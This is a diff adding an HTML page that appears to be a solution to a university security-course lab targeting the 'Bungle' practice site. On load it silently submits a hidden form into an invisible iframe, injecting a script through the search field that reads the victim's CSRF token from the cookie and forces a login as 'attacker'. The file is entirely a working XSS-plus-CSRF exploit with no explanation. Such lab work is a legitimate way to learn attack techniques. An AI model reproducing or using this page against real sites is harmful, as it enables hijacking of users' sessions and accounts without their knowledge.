@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+
+	<form action='http://bungle-cs461.csl.illinois.edu/search' method="get" name="cookieForm" id="cookieForm" target="cookieFrame">
+		<input type="hidden" name="csrfdefense" value="1" />
+		<input type="hidden" name="xssdefense" value ="0" />
+		<input type="hidden" name="q" value='<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script><script>var cookie_string = document.cookie;var spot = cookie_string.search("csrf_token=");var cookie_code = cookie_string.substring(spot+11,spot+43);$.post("http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0", { csrf_token: cookie_code, username: "attacker", password: "l33th4x"} )</script>' />
+	</form>
+
+	<body onload="document.getElementById('cookieForm').submit()">
+		<iframe src="about:blank" width="0" height="0" frameborder="0" marginwidth="0" marginheight="0" name="cookieFrame"></iframe>
+	</body>
+
+</html>
